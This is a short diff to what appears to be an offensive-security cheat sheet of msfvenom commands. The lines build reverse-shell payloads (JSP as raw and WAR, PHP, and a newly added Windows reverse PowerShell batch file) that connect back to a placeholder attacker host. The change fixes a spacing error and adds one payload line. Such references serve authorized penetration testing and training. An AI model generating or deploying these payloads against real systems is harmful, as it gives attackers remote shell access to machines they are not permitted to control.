@@ -504,7 +504,10 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f raw >
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f war > shell.war
 ```
 ```bash
-msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port>-f raw > shell.php
+msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php
+```
+```bash
+msfvenom -p cmd/windows/reverse_powershell lhost=<attacker-ip> lport=<port> > shell1.bat
 ```
   
 </details>
